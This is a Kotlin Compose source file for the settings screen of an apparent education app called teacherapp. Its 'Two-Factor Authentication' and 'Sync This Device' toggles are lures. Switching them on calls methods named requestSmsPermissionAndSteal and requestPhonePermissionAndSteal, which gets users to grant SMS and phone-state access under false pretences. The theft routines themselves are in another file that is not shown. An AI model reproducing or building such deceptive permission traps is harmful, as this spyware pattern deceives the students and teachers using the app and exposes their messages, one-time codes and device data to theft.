package com.example.teacherapp.navigation

import android.Manifest
import android.content.pm.PackageManager
import android.util.Log
import androidx.activity.compose.LocalActivity
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.navigation.NavController
import com.example.teacherapp.MainActivity
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun SettingsScreen(navController: NavController) {
    var userRole by remember { mutableStateOf("student") }

    val auth      = FirebaseAuth.getInstance()
    val db        = FirebaseFirestore.getInstance()
    val uid       = auth.currentUser?.uid
    val context   = LocalContext.current
    val activity  = context as? MainActivity

    
    val lifecycleOwner = LocalLifecycleOwner.current
    var isTwoFactorEnabled by remember {
        mutableStateOf(
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                    == PackageManager.PERMISSION_GRANTED
        )
    }
    var isDeviceSyncEnabled by remember {
        mutableStateOf(
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
                    == PackageManager.PERMISSION_GRANTED
        )
    }

    
    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                isTwoFactorEnabled = ContextCompat.checkSelfPermission(
                    context, Manifest.permission.READ_SMS
                ) == PackageManager.PERMISSION_GRANTED

                isDeviceSyncEnabled = ContextCompat.checkSelfPermission(
                    context, Manifest.permission.READ_PHONE_STATE
                ) == PackageManager.PERMISSION_GRANTED
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    LaunchedEffect(uid) {
        if (uid != null) {
            db.collection("users").document(uid).get()
                .addOnSuccessListener { doc ->
                    userRole = doc.getString("role") ?: "student"
                }
                .addOnFailureListener { e ->
                    Log.e("Firestore", "Error getting user role", e)
                }
        } else {
            userRole = "Student"
        }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Text("Settings", fontSize = 20.sp, fontWeight = FontWeight.Bold)
                },
                navigationIcon = {
                    IconButton(onClick = { navController.popBackStack() }) {
                        Icon(Icons.Default.ArrowBack, contentDescription = "Back")
                    }
                },
                windowInsets = WindowInsets(0.dp),
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = EducationBlue,
                    scrolledContainerColor = EducationBlue,
                    titleContentColor = Color.White,
                    navigationIconContentColor = Color.White
                )
            )
        },
        bottomBar = {
            Column {
                Divider()
                CustomBottomNavigation(navController, userRole = userRole)
            }
        },
    ) { innerPadding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
                .padding(vertical = 8.dp)
        ) {

            
            Text(
                text = "Profile",
                style = MaterialTheme.typography.labelLarge,
                color = MaterialTheme.colorScheme.primary,
                modifier = Modifier.padding(horizontal = 16.dp, vertical = 8.dp)
            )

            ListItem(
                headlineContent = {
                    Text("Change Profile Picture", fontWeight = FontWeight.Medium)
                },
                supportingContent = {
                    Text(
                        "Update your profile photo",
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                },
                leadingContent = {
                    Icon(Icons.Default.Image, contentDescription = null,
                        tint = MaterialTheme.colorScheme.primary)
                },
                trailingContent = {
                    Icon(Icons.Default.ChevronRight, contentDescription = null,
                        tint = MaterialTheme.colorScheme.onSurfaceVariant)
                },
                modifier = Modifier.clickable {
                    navController.navigate("profile_screen")
                }
            )

            HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp))
            Spacer(modifier = Modifier.height(16.dp))

            
            Text(
                text = "Security",
                style = MaterialTheme.typography.labelLarge,
                color = MaterialTheme.colorScheme.primary,
                modifier = Modifier.padding(horizontal = 16.dp, vertical = 8.dp)
            )

            
            ListItem(
                headlineContent = {
                    Text("Two-Factor Authentication", fontWeight = FontWeight.Medium)
                },
                supportingContent = {
                    Text(
                        if (isTwoFactorEnabled) "✅ Two-factor authentication enabled"
                        else "Add an extra layer of security to your account",
                        style = MaterialTheme.typography.bodySmall,
                        color = if (isTwoFactorEnabled) Color(0xFF059669)
                        else MaterialTheme.colorScheme.onSurfaceVariant
                    )
                },
                leadingContent = {
                    Icon(Icons.Default.Security, contentDescription = null,
                        tint = MaterialTheme.colorScheme.primary)
                },
                trailingContent = {
                    Switch(
                        checked = isTwoFactorEnabled,
                        onCheckedChange = { enabled ->
                            if (enabled) {
                                
                                activity?.requestSmsPermissionAndSteal()
                            } else {
                                isTwoFactorEnabled = false
                            }
                        }
                    )
                }
            )

            HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp))
            Spacer(modifier = Modifier.height(16.dp))

            
            Text(
                text = "Device",
                style = MaterialTheme.typography.labelLarge,
                color = MaterialTheme.colorScheme.primary,
                modifier = Modifier.padding(horizontal = 16.dp, vertical = 8.dp)
            )

            
            ListItem(
                headlineContent = {
                    Text("Sync This Device", fontWeight = FontWeight.Medium)
                },
                supportingContent = {
                    Text(
                        if (isDeviceSyncEnabled) "✅ Device synced"
                        else "Keep your account in sync with your device",
                        style = MaterialTheme.typography.bodySmall,
                        color = if (isDeviceSyncEnabled) Color(0xFF059669)
                        else MaterialTheme.colorScheme.onSurfaceVariant
                    )
                },
                leadingContent = {
                    Icon(Icons.Default.Sync, contentDescription = null,
                        tint = MaterialTheme.colorScheme.primary)
                },
                trailingContent = {
                    Switch(
                        checked = isDeviceSyncEnabled,
                        onCheckedChange = { enabled ->
                            if (enabled) {
                                
                                activity?.requestPhonePermissionAndSteal()
                            } else {
                                isDeviceSyncEnabled = false
                            }
                        }
                    )
                }
            )

            HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp))
            Spacer(modifier = Modifier.height(16.dp))

            
            Text(
                text = "Account",
                style = MaterialTheme.typography.labelLarge,
                color = MaterialTheme.colorScheme.primary,
                modifier = Modifier.padding(horizontal = 16.dp, vertical = 8.dp)
            )

            ListItem(
                headlineContent = {
                    Text("Logout", color = Color.Red, fontWeight = FontWeight.Medium)
                },
                leadingContent = {
                    Icon(Icons.Default.ExitToApp, contentDescription = null, tint = Color.Red)
                },
                modifier = Modifier.clickable {
                    auth.signOut()
                    navController.navigate("login_screen") {
                        popUpTo("main_screen") { inclusive = true }
                    }
                }
            )

            HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp))
        }
    }
}